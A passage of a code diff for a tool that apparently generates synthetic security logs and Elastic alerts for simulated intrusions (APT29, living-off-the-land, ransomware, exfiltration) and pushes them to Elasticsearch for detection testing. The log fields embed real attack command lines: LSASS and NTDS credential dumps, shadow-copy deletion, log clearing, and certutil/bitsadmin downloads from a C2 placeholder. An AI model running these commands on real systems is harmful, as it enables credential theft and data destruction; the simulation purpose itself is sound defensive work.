Movement',technique:'T1021.002',techniqueName:'SMB/Windows Admin Shares',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,65*60)),event:{kind:"alert",severity:99},rule:{name:"Phishing → Credential Dump → Lateral Movement",severity:"critical",risk_score:99},affected_hosts:[ctx.victim.hostname,ctx.secondHost.hostname]})});return events;}
 function generateExfiltrationScenario(){const ctx=makeCtx(),base=new Date(Date.now()-60*60000),e=[];e.push({step:1,timestamp:tsOff(base,0),description:'Sensitive files staged in temp directory',source:'Endpoint Telemetry',severity:'high',tactic:'Collection',technique:'T1074.001',techniqueName:'Local Data Staging',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,0)),event:{kind:"event",category:["process"]},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},process:{name:"robocopy.exe",command_line:`robocopy C:\\Users\\${ctx.victim.user}\\Documents\\Finance ${ctx.stagingDir}data /E`}})});e.push({step:2,timestamp:tsOff(base,5*60),description:'Data compressed with password-protected 7-Zip archive',source:'Endpoint Telemetry',severity:'high',tactic:'Collection',technique:'T1560.001',techniqueName:'Archive via Utility',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,5*60)),event:{kind:"event",category:["process"]},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},process:{name:"7z.exe",command_line:`7z a -tzip -p"Sup3rS3cr3t!" ${ctx.stagingDir}archive.zip ${ctx.stagingDir}data\\*`}})});e.push({step:3,timestamp:tsOff(base,12*60),description:'Large HTTPS upload to unknown cloud service (50MB+)',source:'Fortinet FortiGate',severity:'high',tactic:'Exfiltration',technique:'T1048.003',techniqueName:'Non-Application Layer Protocol',log:`date=${tsOff(base,12*60).toISOString().split('T')[0]} time=${tsOff(base,12*60).toTimeString().split(' ')[0]} devname="FGT-EDGE-01" type="traffic" action="accept" srcip=${ctx.victim.ip} dstip=104.18.22.44 dstport=443 hostname="file-transfer-service.io" sentbyte=54525952 msg="Unusually large upload detected"`});e.push({step:4,timestamp:tsOff(base,20*60),description:'DNS tunneling detected — high entropy subdomains',source:'Fortinet FortiGate',severity:'critical',tactic:'Exfiltration',technique:'T1048.001',techniqueName:'Exfiltration Over Alternative Protocol',log:`date=${tsOff(base,20*60).toISOString().split('T')[0]} time=${tsOff(base,20*60).toTimeString().split(' ')[0]} devname="FGT-EDGE-01" type="utm" subtype="dns" action="blocked" srcip=${ctx.victim.ip} dnsquery="bG9yZW1pcHN1bQ==.${ctx.c2Domain}" attack="DNS.Exfiltration" severity="critical"`});e.push({step:5,timestamp:tsOff(base,25*60),description:'Audit log cleared — attacker covering tracks (Event 1102)',source:'Windows Security',severity:'critical',tactic:'Defense Evasion',technique:'T1070.001',techniqueName:'Clear Windows Event Logs',log:`<Event><System><EventID>1102</EventID><TimeCreated SystemTime="${formatTimestamp(tsOff(base,25*60))}"/><Channel>Security</Channel><Computer>${ctx.victim.hostname}.contoso.com</Computer></System><EventData><Data Name="SubjectUserName">${ctx.victim.user}</Data><Data Name="SubjectDomainName">CONTOSO</Data></EventData></Event>`});e.push({step:6,timestamp:tsOff(base,26*60),description:'Elastic Security alert — Data Exfiltration confirmed',source:'Elastic Security Alert',severity:'critical',tactic:'Exfiltration',technique:'T1048',techniqueName:'Exfiltration Over Alternative Protocol',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,26*60)),event:{kind:"alert",severity:99},rule:{name:"Multi-Vector Data Exfiltration Detected",severity:"critical",risk_score:97},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user}})});return e;}
 function generateRansomwareScenario(){const ctx=makeCtx(),base=new Date(Date.now()-50*60000),e=[];e.push({step:1,timestamp:tsOff(base,0),description:'Macro-enabled document opened from email attachment',source:'Endpoint Telemetry',severity:'high',tactic:'Initial Access',technique:'T1566.001',techniqueName:'Spearphishing Attachment',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,0)),event:{kind:"event",category:["process"]},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},process:{name:"WINWORD.EXE",command_line:`WINWORD.EXE /n "C:\\Users\\${ctx.victim.user}\\Downloads\\Invoice_March.docm"`}})});e.push({step:2,timestamp:tsOff(base,3*60),description:'Office spawns encoded PowerShell — macro executing payload',source:'Endpoint Telemetry',severity:'critical',tactic:'Execution',technique:'T1059.001',techniqueName:'PowerShell',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,3*60)),event:{kind:"event",category:["process"]},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},process:{name:"powershell.exe",command_line:"powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",parent:{name:"WINWORD.EXE"}}})});e.push({step:3,timestamp:tsOff(base,6*60),description:'Shadow copies deleted — pre-ransomware preparation',source:'Endpoint Telemetry',severity:'critical',tactic:'Impact',technique:'T1490',techniqueName:'Inhibit System Recovery',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,6*60)),event:{kind:"event",category:["process"]},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},process:{name:"vssadmin.exe",command_line:"vssadmin.exe delete shadows /all /quiet",parent:{name:"powershell.exe"}}})});e.push({step:4,timestamp:tsOff(base,8*60),description:'Mass file rename detected — .locked extension (encryption in progress)',source:'Endpoint Telemetry',severity:'critical',tactic:'Impact',technique:'T1486',techniqueName:'Data Encrypted for Impact',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,8*60)),event:{kind:"event",category:["file"],action:"file_rename"},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},file:{name:"Annual_Report_2024.docx.locked",extension:".locked"},process:{name:"svchost32.exe"},message:"Rapid mass file encryption: 1,847 files renamed in 90 seconds"})});e.push({step:5,timestamp:tsOff(base,9*60),description:'Ransomware SMB spread attempt (EternalBlue)',source:'Fortinet FortiGate',severity:'critical',tactic:'Lateral Movement',technique:'T1210',techniqueName:'Exploitation of Remote Services',log:`date=${tsOff(base,9*60).toISOString().split('T')[0]} time=${tsOff(base,9*60).toTimeString().split(' ')[0]} devname="FGT-CORE-01" type="utm" subtype="ips" action="drop" srcip=${ctx.victim.ip} dstip=192.168.10.0/24 dstport=445 attack="MS.SMB.Server.EternalBlue.Buffer.Overflow" severity="critical" msg="EternalBlue exploitation attempt — possible ransomware spread"`});e.push({step:6,timestamp:tsOff(base,11*60),description:'Elastic Security CRITICAL — Ransomware outbreak confirmed',source:'Elastic Security Alert',severity:'critical',tactic:'Impact',technique:'T1486',techniqueName:'Data Encrypted for Impact',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,11*60)),event:{kind:"alert",severity:100},rule:{name:"Ransomware Outbreak Detected",severity:"critical",risk_score:100,description:"Office macro → encoded PowerShell → VSS deletion → mass file encryption → SMB propagation. Immediate isolation recommended."},host:{hostname:ctx.victim.hostname,ip:[ctx.victim.ip]},user:{name:ctx.victim.user}})});return e;}
+
+// ─── APT Alert Scenarios ──────────────────────────────────────────────────────
+const MITRE_TAC={
+  'Initial Access':'TA0001','Execution':'TA0002','Persistence':'TA0003',
+  'Privilege Escalation':'TA0004','Defense Evasion':'TA0005','Credential Access':'TA0006',
+  'Discovery':'TA0007','Lateral Movement':'TA0008','Collection':'TA0009',
+  'Command and Control':'TA0011','Exfiltration':'TA0010','Impact':'TA0040',
+};
+const makeUuid=()=>[randomHex(8),randomHex(4),randomHex(4),randomHex(4),randomHex(12)].join('-');
+function makeAlert(ts,{ruleName,severity,riskScore,tactic,technique,techniqueName,host,user,proc,net,extra={}}){
+  const tacId=MITRE_TAC[tactic]||'TA0000';
+  return{
+    '@timestamp':ts.toISOString(),
+    event:{kind:'signal',category:['intrusion_detection'],outcome:'success'},
+    kibana:{alert:{
+      uuid:makeUuid(),
+      rule:{uuid:makeUuid(),name:ruleName,description:ruleName,category:'Custom Query Rule',consumer:'siem',producer:'siem',rule_type_id:'siem.queryRule',enabled:true,
+        threat:[{framework:'MITRE ATT&CK',tactic:{id:tacId,name:tactic,reference:`https://attack.mitre.org/tactics/${tacId}/`},technique:technique?[{id:technique,name:techniqueName||technique,reference:`https://attack.mitre.org/techniques/${technique.split('.').join('/')}/`}]:[]}],
+      },
+      severity,risk_score:riskScore,status:'open',workflow_status:'open',
+      original_time:new Date(ts.getTime()-rand(1000,15000)).toISOString(),
+    }},
+    host:{name:host.name,hostname:host.name,ip:[host.ip],os:{name:host.os||'Windows 10',family:'windows'}},
+    user:{name:user.name,domain:user.domain||'CONTOSO'},
+    ...(proc?{process:{name:proc.name,pid:proc.pid||rand(1000,65535),command_line:proc.cmd,parent:{name:proc.parent||'explorer.exe'}}}:{}),
+    ...(net?{destination:{ip:net.ip,port:net.port},network:{direction:'outbound',transport:net.proto||'tcp'},source:{ip:host.ip}}:{}),
+    ...extra,
+  };
+}
+
+function generateAPT29Scenario(){
+  const ctx=makeCtx(),base=new Date(Date.now()-4*3600000);
+  const t=s=>new Date(base.getTime()+s*1000);
+  const v1={name:ctx.victim.hostname,ip:ctx.victim.ip,os:'Windows 10'};
+  const v2={name:ctx.secondHost.hostname,ip:ctx.secondHost.ip,os:'Windows Server 2019'};
+  const u1={name:ctx.victim.user,domain:'CONTOSO'};
+  const alerts=[
+    makeAlert(t(0),{ruleName:'Phishing Email with Malicious OAuth Link Detected',severity:'medium',riskScore:47,tactic:'Initial Access',technique:'T1566.002',techniqueName:'Spearphishing Link',host:v1,user:u1,extra:{email:{from:{address:`no-reply@${ctx.phishingDomain}`},subject:'Action Required: Verify Your Account Access',to:{address:ctx.victim.email}}}}),
+    makeAlert(t(310),{ruleName:'Malicious File Executed from Downloads Folder',severity:'high',riskScore:73,tactic:'Execution',technique:'T1204.002',techniqueName:'Malicious File',host:v1,user:u1,proc:{name:ctx.malwareFile,cmd:`"C:\\Users\\${u1.name}\\Downloads\\${ctx.malwareFile}"`,parent:'chrome.exe'},extra:{file:{hash:{sha256:ctx.malwareHash},name:ctx.malwareFile}}}),
+    makeAlert(t(325),{ruleName:'Suspicious Encoded PowerShell via Malicious Process',severity:'high',riskScore:77,tactic:'Execution',technique:'T1059.001',techniqueName:'PowerShell',host:v1,user:u1,proc:{name:'powershell.exe',cmd:'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAn...',parent:ctx.malwareFile}}),
+    makeAlert(t(360),{ruleName:'Registry Run Key Added for Boot Persistence',severity:'high',riskScore:71,tactic:'Persistence',technique:'T1547.001',techniqueName:'Registry Run Keys / Startup Folder',host:v1,user:u1,proc:{name:'reg.exe',cmd:'reg.exe ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MicrosoftEdgeUpdate /t REG_SZ /d "C:\\ProgramData\\Intel\\msedge32.exe" /f',parent:'powershell.exe'}}),
+    makeAlert(t(400),{ruleName:'Windows Defender Exclusion Path Added',severity:'high',riskScore:69,tactic:'Defense Evasion',technique:'T1562.001',techniqueName:'Disable or Modify Tools',host:v1,user:u1,proc:{name:'powershell.exe',cmd:'Add-MpPreference -ExclusionPath "C:\\ProgramData\\Intel\\"',parent:'powershell.exe'}}),
+    makeAlert(t(430),{ruleName:'BITS Job Used to Download Remote Payload',severity:'medium',riskScore:53,tactic:'Defense Evasion',technique:'T1197',techniqueName:'BITS Jobs',host:v1,user:u1,proc:{name:'bitsadmin.exe',cmd:`bitsadmin.exe /transfer upd /download /priority high http://${ctx.c2Domain}/update.dll C:\\ProgramData\\Intel\\update.dll`,parent:'powershell.exe'}}),
+    makeAlert(t(600),{ruleName:'UAC Bypass via Fodhelper.exe Registry Hijack',severity:'high',riskScore:79,tactic:'Privilege Escalation',technique:'T1548.002',techniqueName:'Bypass User Account Control',host:v1,user:u1,proc:{name:'fodhelper.exe',cmd:'fodhelper.exe',parent:'powershell.exe'},extra:{registry:{path:'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command',value:`C:\\ProgramData\\Intel\\msedge32.exe`}}}),
+    makeAlert(t(680),{ruleName:'WMI Event Subscription Created for Persistence',severity:'high',riskScore:75,tactic:'Persistence',technique:'T1546.003',techniqueName:'Windows Management Instrumentation Event Subscription',host:v1,user:u1,proc:{name:'wmic.exe',cmd:`wmic.exe /namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="MicrosoftUpdate", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"`,parent:'powershell.exe'}}),
+    makeAlert(t(1800),{ruleName:'LSASS Memory Access — Credential Dumping Attempt',severity:'critical',riskScore:93,tactic:'Credential Access',technique:'T1003.001',techniqueName:'LSASS Memory',host:v1,user:u1,proc:{name:'rundll32.exe',cmd:`rundll32.exe comsvcs.dll, MiniDump 640 ${ctx.stagingDir}lsass.dmp full`,parent:'powershell.exe'},extra:{target:{process:{name:'lsass.exe',pid:640}}}}),
+    makeAlert(t(2100),{ruleName:'Domain Account Enumeration via Net.exe',severity:'medium',riskScore:47,tactic:'Discovery',technique:'T1087.002',techniqueName:'Domain Account',host:v1,user:u1,proc:{name:'net.exe',cmd:'net.exe user /domain && net.exe group "Domain Admins" /domain',parent:'cmd.exe'}}),
+    makeAlert(t(2400),{ruleName:'Successful NTLM Pass-the-Hash Authentication',severity:'critical',riskScore:91,tactic:'Lateral Movement',technique:'T1550.002',techniqueName:'Pass the Hash',host:v2,user:u1,net:{ip:ctx.victim.ip,port:445},extra:{winlog:{event_id:4624,channel:'Security',event_data:{LogonType:'3',AuthenticationPackageName:'NTLM',TargetUserName:u1.name,TargetDomainName:'CONTOSO'}}}}),
+    makeAlert(t(2460),{ruleName:'Remote Service Execution via Windows Admin Shares',severity:'critical',riskScore:89,tactic:'Lateral Movement',technique:'T1021.002',techniqueName:'SMB/Windows Admin Shares',host:v2,user:u1,proc:{name:'PSEXESVC.exe',cmd:'cmd.exe /c whoami /all && net localgroup administrators',parent:'services.exe'}}),
+    makeAlert(t(3000),{ruleName:'Bulk File Copy to Staging Directory',severity:'high',riskScore:73,tactic:'Collection',technique:'T1074.001',techniqueName:'Local Data Staging',host:v1,user:u1,proc:{name:'robocopy.exe',cmd:`robocopy.exe "C:\\Users\\${u1.name}\\Documents\\Finance" "${ctx.stagingDir}exfil" /E /Z /COPY:DAT`}}),
+    makeAlert(t(3300),{ruleName:'Outbound C2 Beacon to Known APT29 Infrastructure',severity:'critical',riskScore:97,tactic:'Command and Control',technique:'T1071.001',techniqueName:'Web Protocols',host:v1,user:u1,net:{ip:ctx.c2IP,port:443},extra:{url:{domain:ctx.c2Domain,scheme:'https'},network:{bytes:rand(4096,32768)},threat:{indicator:{ip:ctx.c2IP,domain:ctx.c2Domain,type:'domain-name'}}}}),
+    makeAlert(t(3600),{ruleName:'Large Data Exfiltration over Encrypted C2 Channel',severity:'critical',riskScore:95,tactic:'Exfiltration',technique:'T1041',techniqueName:'Exfiltration Over C2 Channel',host:v1,user:u1,net:{ip:ctx.c2IP2,port:443},extra:{url:{domain:ctx.c2Domain},network:{bytes:rand(52428800,209715200)},threat:{indicator:{ip:ctx.c2IP2,type:'ipv4-addr'}}}}),
+  ];
+  return{meta:{name:'APT29 — Midnight Blizzard',attackerProfile:'Russia-nexus state-sponsored (SVR)',targetOrg:'Enterprise',description:`Full kill-chain APT intrusion: OAuth phishing → ${ctx.malwareFamily} malware (hash: ${ctx.malwareHash.slice(0,16)}…) → persistence → UAC bypass → WMI subscription → credential dump → lateral movement → C2 (${ctx.c2Domain}) → exfiltration. 15 correlated alerts across 11 MITRE tactics.`},ctx,alerts};
+}
+
+function generateLotLScenario(){
+  const ctx=makeCtx(),base=new Date(Date.now()-6*3600000);
+  const t=s=>new Date(base.getTime()+s*1000);
+  const v1={name:ctx.victim.hostname,ip:ctx.victim.ip,os:'Windows 11 Enterprise'};
+  const v2={name:ctx.secondHost.hostname,ip:ctx.secondHost.ip,os:'Windows Server 2022'};
+  const u1={name:ctx.victim.user,domain:'CONTOSO'};
+  const alerts=[
+    makeAlert(t(0),{ruleName:'Certutil.exe Remote File Download',severity:'medium',riskScore:53,tactic:'Initial Access',technique:'T1105',techniqueName:'Ingress Tool Transfer',host:v1,user:u1,proc:{name:'certutil.exe',cmd:`certutil.exe -urlcache -split -f http://${ctx.c2Domain}/update.txt C:\\Windows\\Temp\\update.txt`,parent:'cmd.exe'}}),
+    makeAlert(t(120),{ruleName:'MSHTA Executing Remote Script (Fileless Dropper)',severity:'high',riskScore:77,tactic:'Execution',technique:'T1218.005',techniqueName:'Mshta',host:v1,user:u1,proc:{name:'mshta.exe',cmd:`mshta.exe vbscript:CreateObject("Wscript.Shell").Run("cmd /c powershell -w hidden ...",0,True)(window.close)`,parent:'cmd.exe'}}),
+    makeAlert(t(200),{ruleName:'Scheduled Task Created via Schtasks for Persistence',severity:'high',riskScore:71,tactic:'Persistence',technique:'T1053.005',techniqueName:'Scheduled Task',host:v1,user:u1,proc:{name:'schtasks.exe',cmd:'schtasks.exe /Create /SC ONLOGON /TN "Microsoft\\Windows\\WDF\\WdfDevice" /TR "wscript.exe //B C:\\Windows\\System32\\Tasks\\wdf.vbs" /RU SYSTEM /F',parent:'cmd.exe'}}),
+    makeAlert(t(280),{ruleName:'Security Event Logs Cleared via Wevtutil',severity:'high',riskScore:73,tactic:'Defense Evasion',technique:'T1070.001',techniqueName:'Clear Windows Event Logs',host:v1,user:u1,proc:{name:'wevtutil.exe',cmd:'wevtutil.exe cl Security & wevtutil.exe cl System & wevtutil.exe cl Application',parent:'cmd.exe'}}),
+    makeAlert(t(420),{ruleName:'Token Impersonation via SeDebugPrivilege',severity:'critical',riskScore:87,tactic:'Privilege Escalation',technique:'T1134.001',techniqueName:'Token Impersonation/Theft',host:v1,user:u1,proc:{name:'cmd.exe',cmd:'cmd.exe /c whoami /priv | findstr "SeDebug"',parent:'wscript.exe'}}),
+    makeAlert(t(600),{ruleName:'NTDS.dit Shadow Copy — Active Directory Credential Dump',severity:'critical',riskScore:95,tactic:'Credential Access',technique:'T1003.003',techniqueName:'NTDS',host:v2,user:{name:'SYSTEM',domain:'CONTOSO'},proc:{name:'ntdsutil.exe',cmd:'ntdsutil.exe "activate instance ntds" ifm "create full C:\\Windows\\Temp\\IFM" quit quit',parent:'cmd.exe'}}),
+    makeAlert(t(900),{ruleName:'WMI Remote Process Execution (Lateral Movement)',severity:'critical',riskScore:87,tactic:'Lateral Movement',technique:'T1021.006',techniqueName:'Windows Remote Management',host:v2,user:u1,proc:{name:'wmic.exe',cmd:`wmic.exe /node:"${ctx.secondHost.ip}" /user:"CONTOSO\\${u1.name}" process call create "cmd.exe /c ipconfig /all & net user > C:\\Temp\\out.txt"`,parent:'cmd.exe'}}),
+    makeAlert(t(1200),{ruleName:'Domain Controller and Admin Group Enumeration',severity:'medium',riskScore:47,tactic:'Discovery',technique:'T1018',techniqueName:'Remote System Discovery',host:v2,user:u1,proc:{name:'net.exe',cmd:'net.exe group "Domain Controllers" /domain & net.exe group "Enterprise Admins" /domain',parent:'cmd.exe'}}),
+    makeAlert(t(1500),{ruleName:'Data Archive Created Using Built-in Compression',severity:'high',riskScore:67,tactic:'Collection',technique:'T1560.001',techniqueName:'Archive via Utility',host:v1,user:u1,proc:{name:'powershell.exe',cmd:`Compress-Archive -Path "${ctx.stagingDir}*" -DestinationPath C:\\Windows\\Temp\\logs_backup.zip -Force`,parent:'wscript.exe'}}),
+    makeAlert(t(1800),{ruleName:'Anomalous HTTPS Transfer to Non-Corporate IP',severity:'critical',riskScore:91,tactic:'Exfiltration',technique:'T1048.003',techniqueName:'Exfiltration Over Unencrypted Protocol',host:v1,user:u1,net:{ip:ctx.c2IP,port:443},extra:{network:{bytes:rand(10485760,78643200)},url:{domain:ctx.c2Domain}}}),
+  ];
+  return{meta:{name:'APT — Living off the Land',attackerProfile:'Sophisticated threat actor (no custom malware)',targetOrg:'Enterprise',description:'Fileless intrusion using only Windows built-in utilities: certutil → mshta → schtasks → log clearing → token privilege abuse → NTDS dump → WMI lateral movement → data exfiltration. No malware dropped.'},ctx,alerts};
+}
+
+function generateScenarioNoise(level,tr=120){
+  if(!level||level==='off')return{};
+  const conf={
+    low:   {windows:80, endpoint:50, fortinet:120},
+    medium:{windows:200,endpoint:120,fortinet:300,email:40, linux:60},
+    high:  {windows:500,endpoint:300,fortinet:600,email:100,linux:150,paloalto:200},
+  }[level]||{};
+  const noise={};
+  setPool(level==='high'?20:level==='medium'?10:5);
+  Object.entries(conf).forEach(([vid,count])=>{const v=VENDORS.find(x=>x.id===vid);if(v)noise[vid]=v.generator(count,tr);});
+  setPool(null);
+  return noise;
+}
 
 // ─── Elastic Config ───────────────────────────────────────────────────────────
 const STORAGE_KEY='elastic_config_forge';
@@ -202,7 +469,14 @@ function agentField(type){return{type,version:'8.13.0',ephemeral_id:Math.random(
 function dsField(dataset){return{type:'logs',dataset,namespace:'default'};}
 const VENDOR_INGEST={
   fortinet:{getIndex(l){if(l.includes('type="utm"'))return'logs-fortinet.fortigate.utm-default';if(l.includes('subtype="vpn"'))return'logs-fortinet.fortigate.event-default';return'logs-fortinet.fortigate.traffic-default';},toDoc(l){const ds=l.includes('type="utm"')?'fortinet.fortigate.utm':l.includes('subtype="vpn"')?'fortinet.fortigate.event':'fortinet.fortigate.traffic';const et=l.match(/eventtime=(\d+)/);const ts=et?new Date(parseInt(et[1])*1000).toISOString():new Date().toISOString();return{'@timestamp':ts,message:l,event:{dataset:ds,module:'fortinet',original:l},observer:{vendor:'Fortinet',product:'FortiGate',type:'firewall'},agent:agentField('filebeat'),data_stream:dsField(ds)};}},
-  paloalto:{getIndex(){return'logs-panw.panos-default';},toDoc(l){const cols=l.split(','),lt=cols[2]||'TRAFFIC';return{'@timestamp':cols[0]||new Date().toISOString(),message:l,event:{dataset:'panw.panos',module:'panw',kind:lt==='THREAT'?'alert':'event',original:l},observer:{vendor:'Palo Alto Networks',product:'PAN-OS',type:'firewall'},agent:agentField('filebeat'),data_stream:dsField('panw.panos')};}},
+  paloalto:{getIndex(){return'logs-panw.panos-5.5.0';},toDoc(l){
+    const cols=l.split(',');
+    // New format: cols[0]=syslog_hdr+FUTURE_USE, cols[1]=recv_time (YYYY/MM/DD HH:MM:SS), cols[3]=type
+    const lt=cols[3]||'TRAFFIC';
+    let ts=new Date().toISOString();
+    if(cols[1]){const m=cols[1].trim().match(/^(\d{4})\/(\d{2})\/(\d{2}) (\d{2}):(\d{2}):(\d{2})$/);if(m)ts=new Date(`${m[1]}-${m[2]}-${m[3]}T${m[4]}:${m[5]}:${m[6]}Z`).toISOString();}
+    return{'@timestamp':ts,message:l,event:{dataset:'panw.panos',module:'panw',kind:lt==='THREAT'?'alert':'event',original:l},observer:{vendor:'Palo Alto Networks',product:'PAN-OS',type:'firewall'},agent:agentField('filebeat'),data_stream:dsField('panw.panos')};
+  }},
   switch:{getIndex(){return'logs-cisco.ios-default';},toDoc(l){const tm=l.match(/>(\w{3}\s+\d+\s+\d{2}:\d{2}:\d{2})/);const ts=tm?new Date(tm[1]+' '+new Date().getFullYear()).toISOString():new Date().toISOString();return{'@timestamp':ts,message:l,event:{dataset:'cisco.ios',module:'cisco',kind:'event',original:l},observer:{vendor:'Cisco',product:'Catalyst IOS',type:'switch'},agent:agentField('filebeat'),data_stream:dsField('cisco.ios')};}},
   email:{getIndex(l){if(l.trimStart().startsWith('{'))return'logs-o365.audit-default';if(l.includes('postfix/')||l.includes('NOQUEUE'))return'logs-system.syslog-default';return'logs-microsoft_exchange_server.log-default';},toDoc(l){let ds='microsoft_exchange_server.log',ts=new Date().toISOString();if(l.trimStart().startsWith('{')){try{const o=JSON.parse(l);ds='o365.audit';ts=o.CreationTime||ts;}catch{}}else if(l.includes('postfix/')){ds='system.syslog';}return{'@timestamp':ts,message:l,event:{dataset:ds,module:ds.split('.')[0],category:['email'],original:l},agent:agentField('filebeat'),data_stream:dsField(ds)};}},
   endpoint:{getIndex(l){try{const o=JSON.parse(l);if(o.event?.kind==='alert')return'logs-endpoint.alerts-default';if((o.event?.category||[]).includes('network'))return'logs-endpoint.events.network-default';}catch{}return'logs-endpoint.events.process-default';},toDoc(l){try{const o=JSON.parse(l);const cats=o.event?.category||[];let ds='endpoint.events.process';if(o.event?.kind==='alert')ds='endpoint.alerts';else if(cats.includes('network'))ds='endpoint.events.network';return{...o,agent:{...o.agent,type:'endpoint'},data_stream:dsField(ds),event:{...o.event,dataset:ds,module:'endpoint'}};}catch{return{'@timestamp':new Date().toISOString(),message:l,event:{dataset:'endpoint.events.process'},agent:agentField('elastic_agent'),data_stream:dsField('endpoint.events.process')};}}},
@@ -213,10 +487,10 @@ const VENDOR_INGEST={
   linux:{getIndex(l){if(l.includes('sshd[')||l.includes('sudo:'))return'logs-system.auth-default';if(l.includes('audit['))return'logs-auditd.log-default';return'logs-system.syslog-default';},toDoc(l){let ds='system.syslog';if(l.includes('sshd[')||l.includes('sudo:'))ds='system.auth';else if(l.includes('audit['))ds='auditd.log';const ts=l.match(/^(\w{3}\s+\d+\s+\d{2}:\d{2}:\d{2})/);return{'@timestamp':ts?new Date(ts[1]+' '+new Date().getFullYear()).toISOString():new Date().toISOString(),message:l,event:{dataset:ds,module:ds.split('.')[0],original:l},agent:agentField('filebeat'),data_stream:dsField(ds)};}},
 };
 
-async function pushLogsToElastic(logs){
+async function pushLogsToElastic(logs,indexOverrides={}){
   const cfg=loadConfig();if(!cfg?.url)throw new Error('No Elasticsearch config found');
   const idxCounts={},bulkLines=[];
-  for(const[vid,rawLogs]of Object.entries(logs)){const ing=VENDOR_INGEST[vid];if(!ing)continue;for(const raw of rawLogs){const idx=ing.getIndex(raw);const doc=JSON.parse(JSON.stringify(ing.toDoc(raw)));bulkLines.push(JSON.stringify({create:{_index:idx}}));bulkLines.push(JSON.stringify(doc));idxCounts[idx]=(idxCounts[idx]||0)+1;}}
+  for(const[vid,rawLogs]of Object.entries(logs)){const ing=VENDOR_INGEST[vid];if(!ing)continue;const override=indexOverrides[vid]?.trim()||null;for(const raw of rawLogs){const idx=override||ing.getIndex(raw);const doc=JSON.parse(JSON.stringify(ing.toDoc(raw)));bulkLines.push(JSON.stringify({create:{_index:idx}}));bulkLines.push(JSON.stringify(doc));idxCounts[idx]=(idxCounts[idx]||0)+1;}}
   if(bulkLines.length===0)throw new Error('No logs to push');
   const res=await fetch(`${cfg.url.replace(/\/$/,'')}/_bulk`,{method:'POST',headers:buildHeaders(cfg),body:bulkLines.join('\n')+'\n'});
   if(!res.ok)throw new Error(`HTTP ${res.status}: ${res.statusText}`);
@@ -227,7 +501,7 @@ async function pushLogsToElastic(logs){
 // ─── VENDORS config ───────────────────────────────────────────────────────────
 const VENDORS=[
   {id:'fortinet',name:'Fortinet FortiGate',description:'Traffic, UTM/IPS, and SSL VPN events',tags:['Firewall','UTM','VPN','IPS'],indices:['logs-fortinet.fortigate.traffic-default','logs-fortinet.fortigate.utm-default'],generator:generateFortinetLogs},
-  {id:'paloalto',name:'Palo Alto Networks',description:'PAN-OS traffic and threat logs in CSV syslog format',tags:['NGFW','Threat','Traffic','WildFire'],indices:['logs-panw.panos-default'],generator:generatePaloAltoLogs},
+  {id:'paloalto',name:'Palo Alto Networks',description:'PAN-OS traffic and threat logs in CSV syslog format',tags:['NGFW','Threat','Traffic','WildFire'],indices:['logs-panw.panos-5.5.0'],generator:generatePaloAltoLogs},
   {id:'switch',name:'Cisco Switches',description:'IOS syslog: link state, STP, 802.1X, OSPF',tags:['Switch','STP','NAC','OSPF'],indices:['logs-cisco.ios-default'],generator:generateSwitchLogs},
   {id:'email',name:'E-Mail Systems',description:'Exchange tracking, Postfix MTA, and O365 audit logs',tags:['Exchange','Postfix','O365','Phishing'],indices:['logs-o365.audit-default','logs-microsoft_exchange_server.log-default'],generator:generateEmailLogs},
   {id:'endpoint',name:'Endpoint Telemetry',description:'EDR-style process, network, and alert events with MITRE ATT&CK',tags:['EDR','Process','MITRE','Alerts'],indices:['logs-endpoint.events.process-default','logs-endpoint.alerts-default'],generator:generateEndpointLogs},
@@ -235,10 +509,12 @@ const VENDORS=[
   {id:'linux',name:'Linux / Syslog',description:'SSH auth, sudo, auditd syscalls, cron, and systemd',tags:['SSH','Auditd','Sudo','Syslog'],indices:['logs-system.auth-default','logs-auditd.log-default'],generator:generateLinuxLogs},
 ];
 const SCENARIOS=[
-  {id:'phishing',name:'Phishing Attack',description:'Spearphishing email → file download → execution → C2 beacon. Full Initial Access → Execution → C2 chain.',severity:'critical',tactics:['Initial Access','Execution','Command & Control'],generator:generatePhishingScenario},
-  {id:'phishing-lateral',name:'Phishing + Lateral Movement',description:'Phishing compromise → LSASS dump via Mimikatz → Pass-the-Hash → PsExec lateral movement to second host.',severity:'critical',tactics:['Initial Access','Credential Access','Lateral Movement'],generator:generatePhishingLateralScenario},
-  {id:'exfiltration',name:'Data Exfiltration',description:'File staging → 7-Zip password archive → HTTPS upload + DNS tunneling → audit log cleared.',severity:'critical',tactics:['Collection','Exfiltration','Defense Evasion'],generator:generateExfiltrationScenario},
-  {id:'ransomware',name:'Ransomware Outbreak',description:'Office macro → encoded PowerShell → VSS deletion → mass file encryption → EternalBlue SMB spread.',severity:'critical',tactics:['Execution','Impact','Lateral Movement'],generator:generateRansomwareScenario},
